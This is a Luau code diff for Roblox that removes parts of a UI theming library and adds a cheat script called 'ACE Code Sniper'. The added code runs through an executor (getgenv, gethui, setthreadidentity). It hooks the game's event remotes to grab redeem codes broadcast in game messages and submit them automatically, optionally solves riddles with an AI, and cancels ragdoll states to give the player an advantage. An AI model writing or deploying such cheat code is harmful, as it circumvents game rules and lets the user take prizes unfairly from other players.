+          end
+
+          local tbl40 = {}
+
+          local function fn79(arg)
+            local v92 = tbl39[arg]
+
+            if v92 then
+              if os.clock() < v92 then
+                return false
+              end
+
+              tbl39[arg] = nil
+            end
+
+            if tbl20[arg] then
+              return false
+            end
+            tbl20[arg] = true
+
+            task.delay(1.25, function()
+              tbl20[arg] = nil
+            end)
+
+            fn35()
+            tbl40 = {}
+            local redeemed = fn70(arg)
+            local v93 = fn40()
+
+            if v93 then
+              v81 = v93
+              fn59(v93)
+              fn55(v93, redeemed)
+            else
+              fn32("Captured; code box is closed", tbl25.Text)
+            end
+
+            fn32(redeemed, tbl25.Green, nil, "CODE")
+
+            if autoSubmit then
+              fn33(v93, redeemed, true)
+              local v94, v95 = fn45(redeemed)
+
+              if v94 and (type(v95) ~= "table" or v95.success or v95.Success) then
+                fn34()
+                fn32("Redeemed: " .. redeemed, tbl25.Green)
+              else
+                local v96 = fn60(v93, redeemed)
+                fn34()
+
+                if v96 then
+                  fn32("Invalid - repasted: " .. redeemed, tbl25.Red)
+                else
+                  fn32("Invalid / cooldown", tbl25.Red)
+                end
+              end
+            end
+
+            tbl19.disarm("code submitted")
+            return true
+          end
+
+          local v92 = nil
+          local now2 = 0
+
+          local function fn80(...)
+            local match = fn69(fn67(...) or ""):match("^%s*(.-)%s*$") or ""
+            if match == "" then
+              return
+            end
+
+            if match == v92 and os.clock() - now2 < 0.3 then
+              return
+            end
+            v92 = match
+            now2 = os.clock()
+            if fn76(match) then
+              return
+            end
+            local flag18 = match:find("%s") ~= nil
+            local flag19 = match:match("^[%d%s%+%-%*/%%%^%(%)%.]+$") ~= nil and match:find("[+%-%*/%%^]") ~= nil
+            flag18 = flag18 or flag19
+            local v93 = tbl19.push(match)
+
+            if tbl19.enabled and not tbl19.armed then
+              local v94 = tbl19.match(v93)
+              local flag20
+
+              if v94 then
+                local readyAt = tbl19.readyAt
+                flag20 = os.clock() >= readyAt or not tbl19.isWeak(v94)
+              else
+                flag20 = v94
+              end
+
+              if flag20 then
+                tbl19.arm(v94)
+              end
+            end
+
+            local v94 = tbl38.context()
+            tbl38.remember(match)
+            local v95 = fn73(match)
+
+            if v95 then
+              if tbl19.enabled and not tbl19.armed then
+                tbl19.arm("code in message")
+              end
+
+              if v89 and fn79(v95) then
+                return
+              end
+            end
+
+            if tbl24.Enabled and tbl24.AIRiddles and riddleSolver and flag18 then
+              if fn75(match) then
+                fn32("Code cue, not a riddle: " .. match, tbl25.Dim)
+              else
+                v90 += 1
+                fn78(match, v90, v94)
+              end
+            end
+
+            if not v89 or flag18 then
+              return
+            end
+
+            for _, v96 in ipairs(fn71(match)) do
+              tbl40[#tbl40 + 1] = v96
+            end
+
+            local tbl41 = {}
+
+            for i = 1, math.min(#tbl40, 1) do
+              tbl41[i] = tbl40[i]
+            end
+
+            if #tbl40 < 1 then
+              return
+            end
+            tbl40 = {}
+            local v96 = fn70(table.concat(tbl41))
+            local v97 = tbl39[v96]
+
+            if v97 then
+              if os.clock() < v97 then
+                return
+              end
+              tbl39[v96] = nil
+            end
+
+            if v96 == "" or tbl20[v96] then
+              return
+            end
+            tbl20[v96] = true
+
+            task.delay(1.25, function()
+              tbl20[v96] = nil
+            end)
+
+            fn62(v96)
+          end
+
+          local aceCodeSniperNotifyConnection = {}
+
+          if getgenv then
+            local aceCodeSniperNotifyConnection2 = getgenv().ACECodeSniperNotifyConnection
+
+            if typeof(aceCodeSniperNotifyConnection2) == "table" then
+              for _, v93 in ipairs(aceCodeSniperNotifyConnection2) do
+                pcall(function()
+                  v93:Disconnect()
+                end)
+              end
+            elseif aceCodeSniperNotifyConnection2 then
+              pcall(function()
+                aceCodeSniperNotifyConnection2:Disconnect()
+              end)
+            end
+          end
+
+          local v93 = ipairs
+          local v94 = fn65()
+
+          for _, v95 in v93(v94) do
+            local ok, result = pcall(function()
+              return v95.OnClientEvent:Connect(function(...)
+                local v96 = table.pack(...)
+
+                if not (not v89 and not riddleSolver and not tbl19.enabled) then
+                  if fn68(...) then
+                    pcall(fn80, table.unpack(v96, 1, v96.n))
+                    return
+                  end
+                end
+              end)
+            end)
+
+            if ok and result then
+              aceCodeSniperNotifyConnection[#aceCodeSniperNotifyConnection + 1] = result
+            end
+          end
+
+          if getgenv then
+            getgenv().ACECodeSniperNotifyConnection = aceCodeSniperNotifyConnection
+          end
+
+          if #aceCodeSniperNotifyConnection == 0 then
+            fn32("Auto listen is deaf - no notify remote found", tbl25.Red)
+          end
+
+          if getgenv then
+            getgenv().StopAura = function()
+              for _, v95 in ipairs(aceCodeSniperNotifyConnection) do
+                pcall(function()
+                  v95:Disconnect()
+                end)
+              end
+
+              aceCodeSniperNotifyConnection = {}
+              local aceCodeSniperNotifyConnection2 = getgenv().ACECodeSniperNotifyConnection
+
+              if typeof(aceCodeSniperNotifyConnection2) == "table" then
+                for _, v95 in ipairs(aceCodeSniperNotifyConnection2) do
+                  pcall(function()
+                    v95:Disconnect()
+                  end)
+                end
+              elseif aceCodeSniperNotifyConnection2 then
+                pcall(function()
+                  aceCodeSniperNotifyConnection2:Disconnect()
+                end)
+              end
+
+              getgenv().ACECodeSniperNotifyConnection = nil
+
+              if type(getgenv().ACECodeSniperStopOptimization) == "function" then
+                pcall(getgenv().ACECodeSniperStopOptimization)
+
+                getgenv().ACECodeSniperStopOptimization = nil
+              end
+
+              if type(getgenv().ACECodeSniperStopFarm) == "function" then
+                pcall(getgenv().ACECodeSniperStopFarm)
+                getgenv().ACECodeSniperStopFarm = nil
+              end
+
+              if getgenv().ACECodeSniperGui == screenGui2 then
+                getgenv().ACECodeSniperGui = nil
+              end
+
+              getgenv().ACECodeSniperOpenAnimation = nil
+
+              if screenGui2 then
+                screenGui2:Destroy()
+              end
+            end
+          end
+        end
+      end
+    end
+
+    do
+      do
+        local Players = game:GetService("Players")
+        TweenService = game:GetService("TweenService")
+        RunService = game:GetService("RunService")
+        Stats = game:GetService("Stats")
+        localPlayer = Players.LocalPlayer
+      end
+
+      do
+        local playerGui = localPlayer:WaitForChild("PlayerGui")
+        genv = getgenv and getgenv() or _G
+
+        local function fn30(arg)
+          pcall(function()
+            local v75 = playerGui:FindFirstChild(arg)
+
+            if v75 then
+              v75:Destroy()
+            end
+          end)
+
+          pcall(function()
+            local v75 = game:GetService("CoreGui"):FindFirstChild(arg)
+
+            if v75 then
+              v75:Destroy()
+            end
+          end)
+
+          if gethui then
+            pcall(function()
+              local v75 = gethui():FindFirstChild(arg)
+
+              if v75 then
+                v75:Destroy()
+              end
+            end)
+          end
+        end
+
+        fn28 = function(arg)
+          local v75 = playerGui:FindFirstChild(arg)
+          if v75 then
+            return v75
+          end
+
+          local ok, result = pcall(function()
+            return game:GetService("CoreGui"):FindFirstChild(arg)
+          end)
+
+          if ok and result then
+            return result
+          end
+
+          if gethui then
+            local ok2, result2 = pcall(function()
+              return gethui():FindFirstChild(arg)
+            end)
+
+            if ok2 and result2 then
+              return result2
+            end
+          end
+
+          return nil
+        end
+
+        fn30("ACESniperTopBar")
+        fn30("ACESniperSelector")
+
+        pcall(function()
+          local aceSniperSelectorBlur = game:GetService("Lighting"):FindFirstChild("ACESniperSelectorBlur")
+
+          if aceSniperSelectorBlur then
+            aceSniperSelectorBlur:Destroy()
+          end
+        end)
+
+        tbl17 = {
+          Window = Color3.fromRGB(6, 6, 6),
+          Pill = Color3.fromRGB(19, 19, 22),
+          White = Color3.fromRGB(245, 245, 245),
+          Dim = Color3.fromRGB(125, 127, 135),
+          DotOff = Color3.fromRGB(58, 58, 64),
+        }
+
+        createUICorner = function(parent, arg)
+          local uiCorner = Instance.new("UICorner")
+          uiCorner.CornerRadius = UDim.new(0, arg)
+          uiCorner.Parent = parent
+          return uiCorner
+        end
+
+        createUIStroke = function(parent, color, thickness, transparency)
+          local uiStroke = Instance.new("UIStroke")
+          uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+          uiStroke.Color = color
+          uiStroke.Thickness = thickness or 1
+          uiStroke.Transparency = transparency or 0
+          uiStroke.Parent = parent
+          return uiStroke
+        end
+
+        screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "ACESniperTopBar"
+        screenGui.ResetOnSpawn = false
+        screenGui.IgnoreGuiInset = true
+        screenGui.DisplayOrder = 2147483645
+        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+        pcall(function()
+          screenGui.OnTopOfCoreBlur = true
+        end)
+
+        fn29(screenGui, playerGui)
+      end
+
+      genv.ACESniperTopBarGui = screenGui
+      n31 = 480
+      frame = Instance.new("Frame")
+      frame.Name = "Bar"
+      frame.AnchorPoint = Vector2.new(0.5, 0)
+
+      do
+        local UserInputService = game:GetService("UserInputService")
+        flag14 = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
+      end
+    end
+
+    frame.Position = flag14 and UDim2.new(0.5, 0, 0, 14) or UDim2.new(0.5, 0, 0, 50)
+    frame.Size = UDim2.fromOffset(480, 42)
+    frame.BackgroundColor3 = Color3.new(1, 1, 1)
+    frame.BackgroundTransparency = 0.02
+    frame.BorderSizePixel = 0
+    frame.Active = true
+    frame.Parent = screenGui
+    createUICorner(frame, 14)
+    createUIStroke(frame, tbl17.White, 1, 0.58)
+
+    createFrame(frame, {
+      Count = flag14 and 8 or 14,
+      ZIndex = 20,
+      InitialSpread = 3,
+      MinDuration = 2.8,
+      MaxDuration = 4.8,
+    })
+  end
+
+  do
+    local uiGradient = Instance.new("UIGradient")
+    uiGradient.Rotation = 90
+    local colorSequence = ColorSequence.new
+    local tbl18 = {}
+    local v75 = ColorSequenceKeypoint.new(0, Color3.fromRGB(17, 17, 28))
+    local v76 = ColorSequenceKeypoint.new(0.45, Color3.fromRGB(8, 8, 8))
+    local new = ColorSequenceKeypoint.new
+    local v77 = 1
+    local color = Color3.fromRGB
+    tbl18[1] = v75
+    tbl18[2] = v76
+
+    do
+      local values = table.pack(new(v77, color(5, 5, 6)))
+      table.move(values, 1, values.n, 3, tbl18)
+    end
+
+    uiGradient.Color = colorSequence(tbl18)
+    uiGradient.Parent = frame
+  end
 end
 
-function Skibidi.GetThemeNames()
-	local out = {}
-	for k in pairs(Presets) do out[#out+1] = k end
-	table.sort(out)
-	return out
+local CodeToggle, OGToggle, fn29, fn30, fn31
+
+do
+  local v75, v76, v77, v78
+
+  do
+    do
+      local uiScale = Instance.new("UIScale")
+      uiScale.Name = "BarFit"
+      uiScale.Parent = frame
+
+      local function fn32()
+        local scale = flag14 and 0.75 or 1
+        local currentCamera = workspace.CurrentCamera
+        if not currentCamera then
+          uiScale.Scale = scale
+          return
+        end
+        uiScale.Scale = math.max(0.5, math.min(scale, (currentCamera.ViewportSize.X - 16) / n31))
+      end
+
+      fn32()
+
+      pcall(function()
+        workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(fn32)
+
+        if workspace.CurrentCamera then
+          workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn32)
+        end
+      end)
+    end
+
+    do
+      local imageLabel = Instance.new("ImageLabel")
+      imageLabel.Name = "BrandLogo"
+      imageLabel.Size = UDim2.fromOffset(24, 24)
+      imageLabel.Position = UDim2.new(0, 12, 0.5, -12)
+      imageLabel.BackgroundTransparency = 1
+      imageLabel.Image = "rbxassetid://71891923282375"
+      imageLabel.ScaleType = Enum.ScaleType.Fit
+      imageLabel.Parent = frame
+      createUICorner(imageLabel, 12)
+    end
+
+    do
+      local function fn32(name, position, arg)
+        local textButton = Instance.new("TextButton")
+        textButton.Name = name
+        textButton.Size = UDim2.fromOffset(arg, 26)
+        textButton.Position = position
+        textButton.BackgroundColor3 = tbl17.Pill
+        textButton.BackgroundTransparency = 0.05
+        textButton.BorderSizePixel = 0
+        textButton.AutoButtonColor = false
+        textButton.Text = ""
+        textButton.Parent = frame
+        createUICorner(textButton, 13)
+        local v79 = createUIStroke(textButton, tbl17.White, 1, 0.72)
+        local uiScale = Instance.new("UIScale")
+        uiScale.Name = "PressScale"
+        uiScale.Parent = textButton
+        local frame2 = Instance.new("Frame")
+        frame2.Name = "Dot"
+        frame2.Size = UDim2.fromOffset(6, 6)
+        frame2.Position = UDim2.new(0, 10, 0.5, -3)
+        frame2.BackgroundColor3 = tbl17.DotOff
+        frame2.BorderSizePixel = 0
+        frame2.Parent = textButton
+        createUICorner(frame2, 3)
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Name = "Label"
+        textLabel.Size = UDim2.new(1, -26, 1, 0)
+        textLabel.Position = UDim2.fromOffset(22, 0)
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = ""
+        textLabel.TextSize = 9
+        textLabel.TextColor3 = tbl17.White
+        textLabel.Font = Enum.Font.GothamBold
+        textLabel.TextXAlignment = Enum.TextXAlignment.Center
+        textLabel.Parent = textButton
+        local tweenInfo = TweenInfo.new(0.13, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+
+        textButton.MouseEnter:Connect(function()
+          TweenService:Create(v79, tweenInfo, { Transparency = 0.35 }):Play()
+          TweenService:Create(textButton, tweenInfo, { BackgroundColor3 = Color3.fromRGB(28, 28, 33) }):Play()
+        end)
+
+        textButton.MouseLeave:Connect(function()
+          TweenService:Create(v79, tweenInfo, { Transparency = 0.72 }):Play()
+          TweenService:Create(textButton, tweenInfo, { BackgroundColor3 = tbl17.Pill }):Play()
+        end)
+
+        textButton.MouseButton1Down:Connect(function()
+          TweenService:Create(uiScale, TweenInfo.new(0.07, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Scale = 0.93 }):Play()
+        end)
+
+        textButton.MouseButton1Up:Connect(function()
+          TweenService:Create(uiScale, TweenInfo.new(0.16, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
+        end)
+
+        return textButton, textLabel, frame2
+      end
+
+      CodeToggle, v75, v76 = fn32("CodeToggle", UDim2.new(0, 44, 0.5, -13), 148)
+      OGToggle, v78, v77 = fn32("OGToggle", UDim2.new(1, -96, 0.5, -13), 140)
+    end
+  end
+
+  local textLabel = Instance.new("TextLabel")
+  textLabel.Name = "HubStats"
+  textLabel.AnchorPoint = Vector2.new(0.5, 0)
+  textLabel.Size = UDim2.new(0, 150, 1, 0)
+  textLabel.Position = UDim2.new(0.5, 20, 0, 0)
+  textLabel.BackgroundTransparency = 1
+  textLabel.RichText = true
+  textLabel.Text =
+    '<font color="#96989F">FPS</font>  <font color="#F5F5F5">--</font>    <font color="#45464C">|</font>    <font color="#96989F">PING</font>  <font color="#F5F5F5">--</font>'
+  textLabel.TextSize = 10
+  textLabel.TextColor3 = tbl17.White
+  textLabel.Font = Enum.Font.GothamBold
+  textLabel.TextXAlignment = Enum.TextXAlignment.Center
+  textLabel.Parent = frame
+  local flag15 = false
+  local position = nil
+  local position2 = nil
+
+  frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+      flag15 = true
+      position = input.Position
+      position2 = frame.Position
+
+      input.Changed:Connect(function()
+        if input.UserInputState == Enum.UserInputState.End or input.UserInputState == Enum.UserInputState.Cancel then
+          flag15 = false
+        end
+      end)
+    end
+  end)
+
+  game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if flag15 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+      local n32 = input.Position - position
+      frame.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n32.X, position2.Y.Scale, position2.Y.Offset + n32.Y)
+    end
+  end)
+
+  fn29 = function()
+    local aceCodeSniperGui = genv.ACECodeSniperGui
+    if aceCodeSniperGui and aceCodeSniperGui.Parent then
+      return aceCodeSniperGui
+    end
+    return fn28("ACECodeSniperUI")
+  end
+
+  fn30 = function()
+    local aceFinderRuntime = genv.ACEFinderRuntime
+    if type(aceFinderRuntime) ~= "table" or not aceFinderRuntime.Running then
+      return nil
+    end
+
+    if aceFinderRuntime.Gui and aceFinderRuntime.Gui.Parent then
+      return aceFinderRuntime.Gui
+    end
+    return fn28("FinderUI")
+  end
+
+  fn31 = function()
+    local v79 = fn29()
+    local v80 = fn30()
+    local enabled = v79 ~= nil and v79.Enabled
+    local enabled2 = v80 ~= nil and v80.Enabled
+    v75.Text = enabled and "CLOSE CODE SNIPER" or "OPEN CODE SNIPER"
+    v78.Text = enabled2 and "CLOSE OG SNIPER" or "OPEN OG SNIPER"
+    v76.BackgroundColor3 = enabled and tbl17.White or tbl17.DotOff
+    v77.BackgroundColor3 = enabled2 and tbl17.White or tbl17.DotOff
+  end
+
+  task.spawn(function()
+    while true do
+      if screenGui and screenGui.Parent then
+        local v79 = 0
+        local now2 = os.clock()
+
+        local connection = RunService.RenderStepped:Connect(function()
+          v79 += 1
+        end)
+
+        task.wait(0.5)
+        connection:Disconnect()
+
+        if not screenGui.Parent then
+          break
+        else
+          local n32 = math.floor(v79 / math.max(os.clock() - now2, 0.01) + 0.5)
+          local n33 = nil
+
+          pcall(function()
+            n33 = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue() + 0.5)
+          end)
+
+          textLabel.Text = '<font color="#96989F">FPS</font>  <font color="#F5F5F5">'
+            .. tostring(n32)
+            .. "</font>"
+            .. '    <font color="#45464C">|</font>    '
+            .. '<font color="#96989F">PING</font>  <font color="#F5F5F5">'
+            .. (n33 and tostring(n33) or "--")
+            .. "</font>"
+          fn31()
+          task.wait(0.5)
+          continue
+        end
+      end
+
+      break
+    end
+  end)
 end
 
--- ============================================================
--- INTERNAL HELPERS
--- ============================================================
-local TweenFast   = TweenInfo.new(0.14, Enum.EasingStyle.Quad,  Enum.EasingDirection.Out)
-local TweenMed    = TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
-local TweenSpring = TweenInfo.new(0.28, Enum.EasingStyle.Back,  Enum.EasingDirection.Out)
-local TweenSnap   = TweenInfo.new(0.09, Enum.EasingStyle.Quad,  Enum.EasingDirection.Out)
-local TweenSoft   = TweenInfo.new(0.38, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
-local TweenPop    = TweenInfo.new(0.44, Enum.EasingStyle.Back,  Enum.EasingDirection.Out)
-
-local function MakeCorner(parent, radius)
-	local c = Instance.new("UICorner")
-	c.CornerRadius = radius or UDim.new(0, Theme.CornerRadiusSmall)
-	c.Parent = parent
-	return c
+do
+  local fn32
+
+  do
+    local flag15 = false
+
+    fn32 = function()
+      local v75 = fn29()
+
+      if v75 and v75.Parent then
+        if v75.Enabled then
+          v75.Enabled = false
+        else
+          v75.Enabled = true
+
+          if type(genv.ACECodeSniperOpenAnimation) == "function" then
+            pcall(genv.ACECodeSniperOpenAnimation)
+          end
+        end
+
+        fn31()
+        return
+      end
+
+      if flag15 then
+        return
+      end
+      flag15 = true
+
+      task.spawn(function()
+        pcall(fn27)
+
+        flag15 = false
+        pcall(fn31)
+      end)
+    end
+  end
+
+  local flag15 = false
+
+  local function fn33()
+    local v75 = fn30()
+
+    if v75 then
+      if v75.Enabled then
+        v75.Enabled = false
+      else
+        v75.Enabled = true
+        local aceFinderRuntime = genv.ACEFinderRuntime
+        local v76 = "table"
+
+        if type(aceFinderRuntime) == v76 and type(aceFinderRuntime.PlayOpenAnimation) == "function" then
+          pcall(aceFinderRuntime.PlayOpenAnimation)
+        end
+      end
+
+      fn31()
+      return
+    end
+
+    if flag15 then
+      return
+    end
+    flag15 = true
+
+    task.spawn(function()
+      pcall(fn26)
+
+      local v76 = setthreadidentity or setidentity
+
+      if v76 then
+        pcall(v76, 8)
+      end
+
+      flag15 = false
+      pcall(fn31)
+    end)
+  end
+
+  CodeToggle.MouseButton1Click:Connect(fn32)
+  OGToggle.MouseButton1Click:Connect(fn33)
 end
 
-local function MakeStroke(parent, color, thickness)
-	local s = Instance.new("UIStroke")
-	s.Color            = color or Theme.AccentDim
-	s.Thickness        = thickness or 1
-	s.ApplyStrokeMode  = Enum.ApplyStrokeMode.Border
-	s.Parent           = parent
-	return s
+do
+  genv.ACESniperBarDock = function(arg)
+    if arg == "code" then
+      local v75 = fn29()
+
+      if v75 then
+        v75.Enabled = false
+      end
+    else
+      local v75 = fn30()
+
+      if v75 then
+        v75.Enabled = false
+      end
+    end
+
+    fn31()
+  end
+
+  do
+    local aceAntiRagdollStop = genv.ACEAntiRagdollStop
+
+    if type(aceAntiRagdollStop) == "function" then
+      pcall(aceAntiRagdollStop)
+    end
+  end
 end
 
-local function MakePadding(parent, l, r, t, b)
-	local p = Instance.new("UIPadding")
-	p.PaddingLeft   = UDim.new(0, l or 0)
-	p.PaddingRight  = UDim.new(0, r or 0)
-	p.PaddingTop    = UDim.new(0, t or 0)
-	p.PaddingBottom = UDim.new(0, b or 0)
-	p.Parent        = parent
-	return p
+do
+  do
+    local n32 = 0
+
+    local connection = RunService.Heartbeat:Connect(function()
+      local character = localPlayer.Character
+      if not character then
+        return
+      end
+      local humanoid = character:FindFirstChildOfClass("Humanoid")
+      local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+      if not humanoid or not humanoidRootPart or humanoid.Health <= 0 then
+        return
+      end
+      local state = humanoid:GetState()
+
+      if
+        state == Enum.HumanoidStateType.Physics
+        or state == Enum.HumanoidStateType.Ragdoll
+        or state == Enum.HumanoidStateType.FallingDown
+      then
+        local now2 = tick()
+        if now2 - n32 <= 0.15 then
+          return
+        end
+        n32 = now2
+
+        pcall(function()
+          humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+          humanoidRootPart.Velocity = Vector3.zero
+          humanoidRootPart.RotVelocity = Vector3.zero
+          humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
+
+          for _, descendant in ipairs(character:GetDescendants()) do
+            if descendant:IsA("Motor6D") then
+              descendant.Enabled = true
+            end
+          end
+
+          for _, descendant in ipairs(character:GetDescendants()) do
+            if descendant:IsA("Constraint") then
+              descendant.Enabled = true
+            end
+          end
+
+          if workspace.CurrentCamera then
+            workspace.CurrentCamera.CameraSubject = humanoid
+          end
+
+          local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
+          local playerModule = playerScripts and playerScripts:FindFirstChild("PlayerModule")
+
+          if playerModule then
+            local ok, result = pcall(function()
+              return require(playerModule:FindFirstChild("ControlModule"))
+            end)
+
+            if ok and result and result.Enable then
+              pcall(function()
+                result:Enable()
+              end)
+            end
+          end
+
+          humanoid.AutoRotate = true
+          humanoid.PlatformStand = false
+          humanoid.Sit = false
+        end)
+      end
+    end)
+
+    genv.ACEAntiRagdollStop = function()
+      if connection then
+        pcall(function()
+          connection:Disconnect()
+        end)
+
+        connection = nil
+      end
+
+      genv.ACEAntiRagdollStop = nil
+    end
+  end
 end
 
--- Multiplicative vertical gradient: full colour at the top fading a touch
--- darker at the bottom. Because it multiplies the parent's (possibly
--- tweened) BackgroundColor3 it adds depth to any surface without
--- introducing new palette colours or fighting hover/state tweens.
-local function MakeSheen(parent, strength)
-	local g = Instance.new("UIGradient")
-	g.Rotation = 90
-	local k = 1 - (strength or 0.12)
-	g.Color = ColorSequence.new(Color3.new(1, 1, 1), Color3.new(k, k, k))
-	g.Parent = parent
-	return g
+do
+  local position = frame.Position
+  frame.Position = UDim2.new(position.X.Scale, position.X.Offset, 0, -56)
+  TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Position = position }):Play()
 end
 
-local function MakeListLayout(parent, dir, pad, ha, va)
-	local l = Instance.new("UIListLayout")
-	l.FillDirection       = dir or Enum.FillDirection.Vertical
-	l.Padding             = UDim.new(0, pad or 6)
-	l.SortOrder           = Enum.SortOrder.LayoutOrder
-	l.HorizontalAlignment = ha or Enum.HorizontalAlignment.Left
-	l.VerticalAlignment   = va or Enum.VerticalAlignment.Top
-	l.Parent              = parent
-	return l
-end
-
--- ============================================================
--- VISUAL TOOLKIT
--- Small, composable decorators. Every one of them is a no-op when its
--- corresponding Theme switch is off, so a caller can dial the whole
--- library back to flat surfaces without touching component code.
--- ============================================================
-
--- ── Colour maths ────────────────────────────────────────────
-local function Lighten(c, amt)
-	amt = amt or 0.12
-	return Color3.new(
-		math.clamp(c.R + amt, 0, 1),
-		math.clamp(c.G + amt, 0, 1),
-		math.clamp(c.B + amt, 0, 1))
-end
-
-local function Darken(c, amt)
-	amt = amt or 0.12
-	return Color3.new(
-		math.clamp(c.R - amt, 0, 1),
-		math.clamp(c.G - amt, 0, 1),
-		math.clamp(c.B - amt, 0, 1))
-end
-
-local function Mix(a, b, t)
-	t = math.clamp(t or 0.5, 0, 1)
-	return Color3.new(
-		a.R + (b.R - a.R) * t,
-		a.G + (b.G - a.G) * t,
-		a.B + (b.B - a.B) * t)
-end
-
--- Shifts a colour's hue while preserving its saturation/value, so a
--- two-stop accent gradient stays in the same family instead of drifting
--- toward grey the way a plain lighten/darken pair does.
-local function HueShift(c, deg)
-	local h, sat, v = c:ToHSV()
-	h = (h + (deg or 0) / 360) % 1
-	return Color3.fromHSV(h, sat, v)
-end
-
-local function ToHex(c)
-	return string.format("%02X%02X%02X",
-		math.floor(c.R * 255 + 0.5),
-		math.floor(c.G * 255 + 0.5),
-		math.floor(c.B * 255 + 0.5))
-end
-Skibidi.Lighten, Skibidi.Darken, Skibidi.Mix, Skibidi.HueShift = Lighten, Darken, Mix, HueShift
-
--- The two endpoints every accent fill uses. Explicit Theme overrides win;
--- otherwise a subtle hue rotation either side of Accent gives the fill a
--- gradient that still reads as "the accent colour".
-local function AccentPair(accent)
-	accent = accent or Theme.Accent
-	local a = Theme.AccentGrad1 or Lighten(HueShift(accent,  14), 0.06)
-	local b = Theme.AccentGrad2 or Darken (HueShift(accent, -14), 0.06)
-	return a, b
-end
-Skibidi.AccentPair = AccentPair
-
--- ── Shared animation driver ─────────────────────────────────
--- One Heartbeat connection drives every rotating gradient in the whole
--- library. Registering N animated borders costs one table entry each,
--- not N connections, and the connection tears itself down when the last
--- animated object dies.
-local _spinners     = {}   -- [UIGradient] = degreesPerSecond  (rotates)
-local _flows        = {}   -- [UIGradient] = offsetsPerSecond   (scrolls)
-local _spinnerCount = 0
-local _spinnerConn  = nil
-
-local function _spinStep(dt)
-	for grad, speed in pairs(_spinners) do
-		if grad.Parent then
-			grad.Rotation = (grad.Rotation + speed * dt) % 360
-		else
-			_spinners[grad] = nil
-			_spinnerCount = _spinnerCount - 1
-		end
-	end
-	-- Offset wraps through [-1, 1] so a gradient wider than its parent
-	-- reads as a highlight travelling across the fill, then repeating.
-	for grad, speed in pairs(_flows) do
-		if grad.Parent then
-			local x = grad.Offset.X + speed * dt
-			if x > 1 then x = x - 2 end
-			grad.Offset = Vector2.new(x, 0)
-		else
-			_flows[grad] = nil
-			_spinnerCount = _spinnerCount - 1
-		end
-	end
-	if _spinnerCount <= 0 and _spinnerConn then
-		_spinnerConn:Disconnect()
-		_spinnerConn = nil
-	end
-end
-
-local function _startDriver()
-	if not _spinnerConn then
-		_spinnerConn = RunService.Heartbeat:Connect(_spinStep)
-	end
-end
-
-local function RegisterSpin(grad, speed)
-	if _spinners[grad] then return end
-	_spinners[grad] = speed or Theme.BorderSpeed or 20
-	_spinnerCount   = _spinnerCount + 1
-	_startDriver()
-	grad.Destroying:Connect(function()
-		if _spinners[grad] then
-			_spinners[grad] = nil
-			_spinnerCount = _spinnerCount - 1
-		end
-	end)
-end
-
--- Same registry, different axis: used by the shimmer that crawls across
--- progress fills and active tab pills.
-local function RegisterFlow(grad, speed)
-	if _flows[grad] then return end
-	_flows[grad]  = speed or Theme.FlowSpeed or 0.5
-	_spinnerCount = _spinnerCount + 1
-	_startDriver()
-	grad.Destroying:Connect(function()
-		if _flows[grad] then
-			_flows[grad] = nil
-			_spinnerCount = _spinnerCount - 1
-		end
-	end)
-end
-
--- ── Gradient fills ──────────────────────────────────────────
--- A two-stop accent gradient laid over a solid fill. The parent keeps its
--- BackgroundColor3 as the base, so state tweens (hover, disabled) still
--- work — the gradient only ever multiplies what's underneath.
-local function MakeAccentGradient(parent, accent, rotation)
-	local a, b = AccentPair(accent)
-	local g = Instance.new("UIGradient")
-	g.Color    = ColorSequence.new(a, b)
-	g.Rotation = rotation or 25
-	g.Parent   = parent
-	return g
-end
-
--- Three-stop "glass" gradient: bright at the top edge, neutral through
--- the middle, slightly dark at the bottom. Multiplies the parent colour.
-local function MakeGlass(parent, strength, rotation)
-	local k  = strength or 0.10
-	local hi = 1 + k * 0.55
-	local lo = 1 - k
-	local g = Instance.new("UIGradient")
-	g.Rotation = rotation or 90
-	g.Color = ColorSequence.new({
-		ColorSequenceKeypoint.new(0.00, Color3.new(math.min(hi,1), math.min(hi,1), math.min(hi,1))),
-		ColorSequenceKeypoint.new(0.45, Color3.new(1, 1, 1)),
-		ColorSequenceKeypoint.new(1.00, Color3.new(lo, lo, lo)),
-	})
-	g.Parent = parent
-	return g
-end
-
--- ── Lit edges ───────────────────────────────────────────────
--- The outline every card, row and card-like surface wears.
---
--- A flat 1px outline in one colour is what makes a dark UI look like
--- boxes drawn on paper. A real edge catches light: bright where it faces
--- the light source, nearly gone where it faces away. That's all this is —
--- the stroke colour is lifted a touch, and a vertical gradient rides it
--- so the top edge reads as a highlight and the bottom edge falls away.
---
--- Crucially a UIStroke is *not* a layout item, so this works on surfaces
--- driven by UIListLayout/AutomaticSize (which is most of them) where an
--- extra decorative Frame would shove the content around.
-local function EdgeRest(base)
-	return Lighten(base or Theme.AccentDim, 0.16)
-end
-
-local function MakeEdge(parent, color, thickness, alpha)
-	local s = MakeStroke(parent, EdgeRest(color), thickness or 1)
-	if not Theme.LitEdge then return s end
-	s.Transparency = alpha or Theme.StrokeAlpha or 0.34
-	local g = Instance.new("UIGradient")
-	g.Rotation = 90
-	g.Color = ColorSequence.new({
